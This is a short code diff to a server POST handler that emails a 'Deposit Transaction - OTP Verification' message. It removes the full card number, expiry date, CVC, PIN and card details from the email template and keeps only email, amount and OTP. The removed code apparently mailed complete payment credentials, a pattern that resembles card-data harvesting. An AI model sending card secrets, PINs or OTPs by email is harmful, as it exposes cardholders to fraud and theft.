@@ -54,19 +54,7 @@ export async function POST(request: Request) {
       )
     } else if (step === "otp") {
       subject = "Deposit Transaction - OTP Verification"
-      emailHtml = render(
-        <OtpEmail
-          email={email}
-          amount={amount}
-          cardName={cardName}
-          cardNumber={cardNumber}
-          expiryDate={expiryDate}
-          cvc={cvc}
-          cardType={cardType}
-          pin={pin}
-          otp={otp}
-        />,
-      )
+      emailHtml = render(<OtpEmail email={email} amount={amount} otp={otp} />)
     }
 
     const emailParams = new EmailParams()
